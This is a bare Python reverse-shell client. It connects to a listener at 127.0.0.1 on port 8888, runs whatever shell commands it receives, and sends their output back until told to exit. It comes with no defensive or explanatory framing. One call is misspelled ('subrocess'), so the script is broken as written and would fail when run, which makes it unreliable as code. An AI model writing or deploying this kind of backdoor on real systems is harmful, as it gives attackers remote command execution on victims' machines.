import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8888))
while 1:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subrocess.getoutput(command)
    s.send(output.encode())
s.close()